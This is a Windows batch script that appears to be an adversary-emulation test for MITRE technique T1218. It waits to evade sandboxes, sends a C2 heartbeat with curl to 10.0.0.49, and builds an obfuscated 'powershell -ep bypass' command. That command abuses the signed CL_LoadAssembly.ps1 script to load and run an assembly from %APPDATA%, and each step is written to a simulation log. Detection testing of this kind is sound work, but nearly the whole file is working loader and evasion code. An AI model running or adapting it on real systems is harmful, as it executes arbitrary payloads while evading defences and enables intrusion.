@echo off
SETLOCAL EnableDelayedExpansion
REM PHR_ constants (plain literals)
SET fhndkj=10
SET mnsjkt=https://10.0.0.49/stage/2/icon.png?9285-10
SET blkwod=%APPDATA%\9285\0844b509
SET cklwem=firelox.txt
SET qpclz=9285
SET mkewb=ITZEL-S2BO
SET vczpql=http://https://10.0.0.49

REM Initial sandbox evasion delay
echo [%DATE% %TIME%][DEBUG][%mkewb%]: start_delay>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][%mkewb%]: delay_complete>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul

REM C2 heartbeat (non-obfuscated)
echo [%DATE% %TIME%][DEBUG][%mkewb%]: heartbeat_start>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul
curl -k -s -o nul "!mnsjkt!"
echo [%DATE% %TIME%][DEBUG][%mkewb%]: heartbeat_complete>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul
ping -n 8 127.0.0.1 >nul

REM Setup temp directory
SET wqjpn=%APPDATA%\!fhndkj!
IF NOT EXIST "!wqjpn!" mkdir "!wqjpn!"
echo [%DATE% %TIME%][DEBUG][%mkewb%]: dir_setup=!wqjpn!>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul

REM Obfuscated LOLBIN construction (CL_LoadAssembly.ps1)
SET xrfj=CL
SET zmdk=_L
SET pqon=oadA
SET vxch=ssembly
SET kmnc=.ps1
SET bqrp=%xrfj%%zmdk%%pqon%%vxch%%kmnc%
SET jkwz=Microsoft.NET
SET tnps=Framework
SET yhvd=v4.0.30319
SET rlmt=%SystemRoot%\!jkwz!\!tnps!\!yhvd!\!bqrp!

REM Obfuscated PowerShell command building
SET a=pow
SET b=ers
SET c=hell.exe
SET d=-ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\!bqrp!; LoadAssemblyFromPath !blkwod!\!cklwem!;[Program]::Dale()"
SET cmd1=%a%%b%%c%
SET cmd2=%d%

REM Execute assembly
echo [%DATE% %TIME%][DEBUG][%mkewb%]: assembly_execute_start>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul
%cmd1% !cmd2!
SET dllres=%ERRORLEVEL%
echo [%DATE% %TIME%][DEBUG][%mkewb%]: assembly_execute_result=!dllres!>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

REM TTP logging
SET ttp_res=0
SET err_detail=
IF !dllres! EQU 0 (SET ttp_res=1) ELSE (SET err_detail=exit_code_!dllres!)
echo [%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2% %TIME%][!mkewb!]: !fhndkj!-!qpclz!-T1218|Signed Binary Proxy Execution=!ttp_res!::!err_detail!>> "%APPDATA%\!fhndkj!\macula-simulations.log" 2>nul